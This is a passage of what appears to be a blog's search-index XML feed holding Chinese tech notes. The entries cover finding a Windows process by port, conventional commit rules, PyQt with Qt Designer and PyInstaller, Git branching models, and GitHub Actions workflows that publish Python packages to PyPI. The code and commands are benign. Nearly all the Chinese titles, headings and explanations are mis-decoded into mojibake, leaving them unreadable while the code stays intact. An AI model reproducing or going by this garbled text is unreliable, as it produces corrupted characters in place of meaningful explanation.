    </entry>
    
    
    
    <entry>
      <title>windows ä¸­é€šè¿‡ç«¯å£å·æŸ¥çœ‹è¿›ç¨‹</title>
      <link href="/2022/06/20/windows-%E4%B8%AD%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B/"/>
      <url>/2022/06/20/windows-%E4%B8%AD%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><code>netstat -ano | findstr &lt;port&gt;</code></p><p>å¾—åˆ°pid, ç„¶å</p><p><code>tasklist | findstr &lt;pid&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git CHANGELOG è§„èŒƒ</title>
      <link href="/2022/05/23/git-CHANGELOG-%E8%A7%84%E8%8C%83/"/>
      <url>/2022/05/23/git-CHANGELOG-%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h2 id="çº¦å®šå¼æäº¤"><a href="#çº¦å®šå¼æäº¤" class="headerlink" title="çº¦å®šå¼æäº¤"></a>çº¦å®šå¼æäº¤</h2><ul><li><a href="https://www.conventionalcommits.org/zh-hans/v1.0.0/">å‚è€ƒæ–‡ç« </a></li></ul><p>CHANGELOGçš„æœ¬è´¨å°±æ˜¯éœ€è¦éµå®ˆçº¦å®šå¼æäº¤ï¼Œçº¦å®šå¼æäº¤è§„èŒƒæ˜¯ä¸€ç§åŸºäºæäº¤ä¿¡æ¯çš„è½»é‡çº§çº¦å®šã€‚ å®ƒæä¾›äº†ä¸€ç»„ç®€å•è§„åˆ™æ¥åˆ›å»ºæ¸…æ™°çš„æäº¤å†å²ï¼› è¿™æ›´æœ‰åˆ©äºç¼–å†™è‡ªåŠ¨åŒ–å·¥å…·ã€‚ é€šè¿‡åœ¨æäº¤ä¿¡æ¯ä¸­æè¿°åŠŸèƒ½ã€ä¿®å¤å’Œç ´åæ€§å˜æ›´ï¼Œ ä½¿è¿™ç§æƒ¯ä¾‹ä¸<a href="https://semver.org/">SemVer</a>ç›¸äº’å¯¹åº”ã€‚</p><h3 id="ä¸ºä»€ä¹ˆä½¿ç”¨çº¦å®šå¼æäº¤"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨çº¦å®šå¼æäº¤" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨çº¦å®šå¼æäº¤"></a>ä¸ºä»€ä¹ˆä½¿ç”¨çº¦å®šå¼æäº¤</h3><ul><li>è‡ªåŠ¨åŒ–ç”Ÿæˆ CHANGELOGã€‚</li><li>åŸºäºæäº¤çš„ç±»å‹ï¼Œè‡ªåŠ¨å†³å®šè¯­ä¹‰åŒ–çš„ç‰ˆæœ¬å˜æ›´ã€‚</li><li>å‘åŒäº‹ã€å…¬ä¼—ä¸å…¶ä»–åˆ©ç›Šå…³ç³»è€…ä¼ è¾¾å˜åŒ–çš„æ€§è´¨ã€‚</li><li>è§¦å‘æ„å»ºå’Œéƒ¨ç½²æµç¨‹ã€‚</li><li>è®©äººä»¬æ¢ç´¢ä¸€ä¸ªæ›´åŠ ç»“æ„åŒ–çš„æäº¤å†å²ï¼Œä»¥ä¾¿é™ä½å¯¹ä½ çš„é¡¹ç›®åšå‡ºè´¡çŒ®çš„éš¾åº¦ã€‚</li></ul><h3 id="commit-è§„èŒƒ"><a href="#commit-è§„èŒƒ" class="headerlink" title="commit è§„èŒƒ"></a>commit è§„èŒƒ</h3><p>æ¯æ¬¡æäº¤ï¼ŒCommit message éƒ½åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderï¼ŒBody å’Œ Footerã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt; </span><span class="line">// ç©ºä¸€è¡Œ </span><span class="line">&lt;body&gt; </span><span class="line">// ç©ºä¸€è¡Œ </span><span class="line">&lt;footer&gt;</span><span class="line">å¤åˆ¶ä»£ç </span></code></pre></div></div><p>å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer å¯ä»¥çœç•¥ã€‚</p><ol><li>typeçš„ç±»å‹</li></ol><ul><li>featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰</li><li>fixï¼šä¿®è¡¥ bug</li><li>docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰</li><li>styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰</li><li>refactorï¼šé‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹ bug çš„ä»£ç å˜åŠ¨ï¼‰</li><li>testï¼šå¢åŠ æµ‹è¯•</li><li>choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨(CI)</li><li>perf: æå‡æ€§èƒ½</li></ul><ol start="2"><li>scop </li></ol><p>ç”¨äºè¯´æ˜ commit å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒã€‚</p><ol start="3"><li>subject</li></ol><p>subject æ˜¯ commit ç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡ 50 ä¸ªå­—ç¬¦ã€‚</p><ul><li>ä»¥åŠ¨è¯å¼€å¤´ï¼Œä½¿ç”¨ç¬¬ä¸€äººç§°ç°åœ¨æ—¶ï¼Œæ¯”å¦‚ changeï¼Œè€Œä¸æ˜¯ changed æˆ– changes</li><li>ç¬¬ä¸€ä¸ªå­—æ¯å°å†™</li><li>ç»“å°¾ä¸åŠ å¥å·ï¼ˆ.ï¼‰</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;short summary&gt;</span><span class="line">  â”‚       â”‚             â”‚</span><span class="line">  â”‚       â”‚             â””â”€â«¸ Summary in present tense. Not capitalized. No period at the end.</span><span class="line">  â”‚       â”‚</span><span class="line">  â”‚       â””â”€â«¸ Commit Scope: The scope should be the name of the component affected</span><span class="line">  â”‚                           (as perceived by the person reading the </span><span class="line">  â”‚                          changelog generated from commit messages).</span><span class="line">  â”‚</span><span class="line">  â””â”€â«¸ Commit Type: build|ci|docs|feat|fix|perf|refactor|test</span></code></pre></div></div><h3 id="VScode-æ’ä»¶"><a href="#VScode-æ’ä»¶" class="headerlink" title="VScode æ’ä»¶"></a>VScode æ’ä»¶</h3><p>æ¨èä½¿ç”¨<code>git-commit-plugin</code>è¿™ä¸ªæ’ä»¶</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyQt å’Œ Qt Designer</title>
      <link href="/2022/04/26/pyqt-%E5%92%8C-qt-designer/"/>
      <url>/2022/04/26/pyqt-%E5%92%8C-qt-designer/</url>
      
        <content type="html"><![CDATA[<ul><li><code>PyQt</code>æ˜¯ Python è¯­è¨€çš„ GUI ç¼–ç¨‹è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚</li><li><code>Qt Designer</code>æ˜¯PyQtç¨‹åºUIç•Œé¢çš„å®ç°å·¥å…·ï¼Œä½¿ç”¨Qt Designerå¯ä»¥æ‹–æ‹½ã€ç‚¹å‡»å®ŒæˆGUIç•Œé¢è®¾è®¡ï¼Œå¹¶ä¸”è®¾è®¡å®Œæˆçš„.uiç¨‹åºå¯ä»¥è½¬æ¢æˆ.pyæ–‡ä»¶ä¾›pythonç¨‹åºè°ƒç”¨</li></ul><h2 id="Qt-Desinger"><a href="#Qt-Desinger" class="headerlink" title="Qt Desinger"></a>Qt Desinger</h2><p>æ¨èé˜…è¯»<a href="https://blog.l0v0.com/posts/bea01990.html">è¿™ç¯‡æ–‡ç« </a></p><p>å¦å¤–åœ¨ä½¿ç”¨VsCodeçš„æ—¶å€™ï¼Œæ¨è<code>Qt for python</code>æ’ä»¶ã€‚å°†ä¸€ä¸‹ä¸¤ä¸ªé€‰é¡¹æ”¹ä¸º<code>-o &quot;$&#123;fileDirname&#125;$&#123;pathSeparator&#125;$&#123;fileBasenameNoExtension&#125;.py&quot;</code></p><p><img src="/2022/04/26/pyqt-%E5%92%8C-qt-designer/1.png"></p><p>è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥åœ¨æ¯æ¬¡ä¿å­˜Qt Desingerçš„æ—¶å€™ï¼Œè‡ªåŠ¨ç¼–è¯‘æ›´æ–°<code>.ui</code>æ–‡ä»¶ä¸º<code>.py</code>äº†ã€‚</p><h2 id="PyQt"><a href="#PyQt" class="headerlink" title="PyQt"></a>PyQt</h2><p>åœ¨å®Œæˆäº†UIè®¾è®¡åä¸€èˆ¬é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰§è¡Œã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> PyQt5 <span class="hljs-keyword">import</span> QtWidgets</span><span class="line"><span class="hljs-keyword">from</span> .ui <span class="hljs-keyword">import</span> Ui_Form</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PyTemplateWindow</span>(<span class="hljs-params">QtWidgets.QWidget, Ui_Form</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-built_in">super</span>(PyTemplateWindow, self).__init__()</span><span class="line">        self.setupUi(self)</span><span class="line"></br></span><span class="line"> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    app = QtWidgets.QApplication(sys.argv)</span><span class="line">    win = PyTemplateWindow()</span><span class="line">    win.show()</span><span class="line">    sys.exit(app.exec_())</span></code></pre></div></div><h2 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h2><p>æ‰“åŒ…æ–¹å¼ä½¿ç”¨<code>pyinstaller</code></p><p><code>pyinstaller -F -w window.py</code></p><p>è¿™æ ·å¯ä»¥æ‰“åŒ…ä¸ºå•ä¸ªæ–‡ä»¶ï¼Œå¦‚æœéœ€è¦å¯¹æ‰“åŒ…çš„å‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œå¯ä»¥åœ¨åˆšåˆšç”Ÿæˆçš„<code>.spec</code>æ–‡ä»¶ä¸­åšä¿®æ”¹ã€‚ä¿®æ”¹å®Œæˆå<br><code>pyinstaller &lt;.spec&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼€å‘æ—¶å¦‚ä½•ä½¿ç”¨Gitåˆ†æ”¯</title>
      <link href="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/"/>
      <url>/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨å¼€å‘çš„æ—¶å€™å¹¶æ²¡æœ‰ä¸€ä¸ªæˆç†Ÿçš„gitå¼€å‘æµç¨‹ï¼Œè¿™æ¬¡æ•´ç†ä¸‰ç§å¼€å‘æµã€‚</p><p>æµè¡Œçš„å¼€å‘æµæœ‰ä¸‰ç§ï¼š</p><ol><li>TrunkBasedï¼šä¸»å¹²åœ¨æ‰‹ï¼Œå¤©ä¸‹æˆ‘æœ‰ã€‚æ‰€æœ‰ä»£ç éƒ½å¾€ä¸»å¹²ä¸Šæ‹›å‘¼ï¼Œå‘ç‰ˆä¹Ÿåªç”¨ä¸»å¹²ã€‚</li><li>GitFlowï¼šä¸¥è°¨ã€è§„èŒƒã€éš¾ç”¨ï¼Œä¸»è¦æ˜¯è®°ä¸ä½è¯¥å¾€å“ªä¸ªåˆ†æ”¯åˆå¹¶äº†ã€‚</li><li>AoneFlowï¼šå‰ä¸¤ç§éƒ½ä¸è¡Œï¼Œé‚£å°±å€Ÿé‰´å„è‡ªçš„ä¼˜ç‚¹ï¼Œè¾¾åˆ°é˜´é˜³å¹³è¡¡ï¼Œä¸­åº¸ä¹Ÿã€‚</li></ol><h2 id="TrunkBased"><a href="#TrunkBased" class="headerlink" title="TrunkBased"></a>TrunkBased</h2><p>è¿™ç§å¼€å‘æµå°†æ‰€æœ‰ä¸œè¥¿éƒ½ä¸¢åˆ°ä¸»çº¿ä¸Šï¼Œç„¶åå†ä»ä¸»çº¿ä¸Šæ‹‰å–åˆ†æ”¯ä½œä¸ºreleaseã€‚ç®€å•ç²—æš´ï¼Œå…¶å®å¾ˆé€‚åˆä¸ªäººå¼€å‘ã€‚</p><p><img src="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/1.jpg"></p><h2 id="GitFlow"><a href="#GitFlow" class="headerlink" title="GitFlow"></a>GitFlow</h2><p>è¿™ä¸­å¼€å‘æµä¸¥è°¨ï¼Œä½†æ˜¯ç•¥æ˜¾å¤æ‚ã€‚</p><p><img src="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/2.jpg"></p><p><code>master</code>: ä¸»çº¿ä¸Šåªèƒ½åˆå¹¶ï¼Œä¸èƒ½åšç›´æ¥ä¿®æ”¹<br><code>develop</code>: å¤§éƒ¨åˆ†æƒ…å†µå¯ä»¥åœ¨è¿™é‡Œç›´æ¥è¿›è¡Œå¼€å‘<br><code>feature/*</code>: æŒ‰ç‰¹æ€§åç§°æ–°å¢åˆ†æ”¯ï¼Œåœ¨ç‰¹æ€§å¼€å‘å®Œæˆååˆå¹¶åˆ°developï¼Œåå¯ä»¥åˆ é™¤ã€‚<br><code>release/*</code>: æŒ‰å‘å¸ƒç‰ˆæœ¬ä»developæ–°å»ºåˆ†æ”¯ï¼Œç”¨äºåœ¨æ­£å¼å‘å¸ƒå‰çš„æµ‹è¯•bugä¿®å¤ç­‰ï¼Œå®Œæˆååˆå¹¶åˆ°masterå’Œdevelopã€‚å®Œæˆåå¯ä»¥åˆ é™¤ã€‚<br><code>hotfix/*</code>: åœ¨ä¸»çº¿å·²ç»å‘å¸ƒçš„ç‰ˆæœ¬ä¸­å‡ºç°éœ€è¦æ‰“è¡¥ä¸çš„æƒ…å†µï¼Œä½¿ç”¨è¿™ä¸ªåˆ†æ”¯ï¼Œå®Œæˆååˆ é™¤ã€‚</p><p><img src="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/3.png"></p><h2 id="AoneFlow"><a href="#AoneFlow" class="headerlink" title="AoneFlow"></a>AoneFlow</h2><p>è¿™ä¸ªå¼€å‘æµçš„ä¸­å¿ƒæ€æƒ³æ˜¯featureæ‹¼è£…æˆreleaseï¼Œç„¶åreleaseåˆå¹¶åˆ°masterã€‚</p><p>æ‰€ä»¥è¿™ä¸ªæ–¹å¼å¼€å‘èµ·æ¥æ˜¯ç»„è£…å¼çš„ï¼Œç‰¹æ€§çµæ´»ã€‚</p><p><img src="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/4.jpg"><br><img src="/2022/04/24/%E5%BC%80%E5%8F%91%E6%97%B6%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Git%E5%88%86%E6%94%AF/5.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github pythonè‡ªåŠ¨Buildåå‘å¸ƒåˆ°PyPI</title>
      <link href="/2022/04/24/github-python%E8%87%AA%E5%8A%A8Build%E5%90%8E%E5%8F%91%E5%B8%83%E5%88%B0PyPI/"/>
      <url>/2022/04/24/github-python%E8%87%AA%E5%8A%A8Build%E5%90%8E%E5%8F%91%E5%B8%83%E5%88%B0PyPI/</url>
      
        <content type="html"><![CDATA[<div class="codeBlockContainer"><div class="codeBlockTitle">.github/workflows/release.yml</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">Python</span> <span class="hljs-string">Package</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">tags:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;v*&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">python-version:</span> <span class="hljs-string">&#x27;3.x&#x27;</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">        pip install setuptools wheel</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python setup.py sdist bdist_wheel</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Publish</span> <span class="hljs-string">distribution</span> <span class="hljs-string">ğŸ“¦</span> <span class="hljs-string">to</span> <span class="hljs-string">PyPI</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">pypa/gh-action-pypi-publish@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">password:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.PYPI_PASSWORD</span> <span class="hljs-string">&#125;&#125;</span></span></code></pre></div></div><p>é¦–å…ˆè¦åœ¨<a href="https://pypi.org/manage/account/#api-tokens">PyPi</a>ä¸­ç”³è¯·tokenï¼Œç„¶åå†åˆ°githubä¸­çš„ä»“åº“é‡Œé¢<br><code>Setting -&gt; Secret</code>ä¸­æ·»åŠ Tokenï¼Œåç§°å°±ä¸º<code>PYPI_PASSWORD</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">tags:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;v*&#x27;</span></span></code></pre></div></div><p>è¿™ä¸ªçš„æ„æ€æ˜¯å½“pushæ‰“æ ‡ç­¾çš„æ—¶å€™å¼€å¤´ä¸º<code>v</code>ã€‚å°†ä¼šæ‰§è¡Œè¿™ä¸ªActionã€‚</p><h2 id="ä½¿ç”¨-poetry-æ„å»º"><a href="#ä½¿ç”¨-poetry-æ„å»º" class="headerlink" title="ä½¿ç”¨ poetry æ„å»º"></a>ä½¿ç”¨ poetry æ„å»º</h2><div class="codeBlockContainer"><div class="codeBlockTitle">.github/workflows/release.yml</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">Python</span> <span class="hljs-string">Package</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">tags:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;v*&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">publish:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">python-version:</span> <span class="hljs-string">&#x27;3.x&#x27;</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">        pip install poetry</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">and</span> <span class="hljs-string">Publish</span> <span class="hljs-string">distribution</span> <span class="hljs-string">ğŸ“¦to</span> <span class="hljs-string">PyPI</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        poetry config pypi-token.pypi $&#123;&#123; secrets.PYPI_PASSWORD &#125;&#125;</span></span><span class="line"><span class="hljs-string">        poetry publish --build</span></span></code></pre></div></div><h2 id="å…ˆæµ‹è¯•ï¼Œæµ‹è¯•æˆåŠŸåå‘å¸ƒ"><a href="#å…ˆæµ‹è¯•ï¼Œæµ‹è¯•æˆåŠŸåå‘å¸ƒ" class="headerlink" title="å…ˆæµ‹è¯•ï¼Œæµ‹è¯•æˆåŠŸåå‘å¸ƒ"></a>å…ˆæµ‹è¯•ï¼Œæµ‹è¯•æˆåŠŸåå‘å¸ƒ</h2><p>æˆ‘ä»¬è¿˜å¯ä»¥å…ˆåšæµ‹è¯•ï¼Œæµ‹è¯•æˆåŠŸåå†å‘å¸ƒã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">.github/workflows/release.yml</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">Templates</span> <span class="hljs-string">and</span> <span class="hljs-string">Publish</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span> [<span class="hljs-string">master</span>, <span class="hljs-string">dev</span>, <span class="hljs-string">test-me-*</span>]</span><span class="line">    <span class="hljs-attr">tags:</span> [<span class="hljs-string">v*</span>]</span><span class="line">  <span class="hljs-attr">pull_request:</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">check:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">python-version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Dependencies</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">        pip install poetry</span></span><span class="line"><span class="hljs-string">        poetry install</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Scripts</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        poetry run tox</span></span><span class="line"></br></span><span class="line">  <span class="hljs-attr">publish:</span></span><span class="line">    <span class="hljs-attr">if:</span> <span class="hljs-string">github.event_name</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;push&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">startsWith(github.ref,</span> <span class="hljs-string">&#x27;refs/tags&#x27;</span><span class="hljs-string">)</span></span><span class="line">    <span class="hljs-attr">needs:</span> <span class="hljs-string">check</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">python-version:</span> <span class="hljs-string">&#x27;3.x&#x27;</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">        pip install poetry</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">and</span> <span class="hljs-string">Publish</span> <span class="hljs-string">distribution</span> <span class="hljs-string">ğŸ“¦to</span> <span class="hljs-string">PyPI</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        poetry config pypi-token.pypi $&#123;&#123; secrets.PYPI_PASSWORD &#125;&#125;</span></span><span class="line"><span class="hljs-string">        poetry publish --build</span></span></code></pre></div></div><p><code>on: [push, pull_request]</code>çš„æ„æ€æ˜¯å½“pushæˆ–è€…pull_requestçš„æ—¶å€™æ‰§è¡Œè¿™ä¸ªActionã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»˜ç”»ç¬”è®°</title>
      <link href="/2022/04/23/%E7%BB%98%E7%94%BB%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/23/%E7%BB%98%E7%94%BB%E7%AC%94%E8%AE%B0/</url>
      
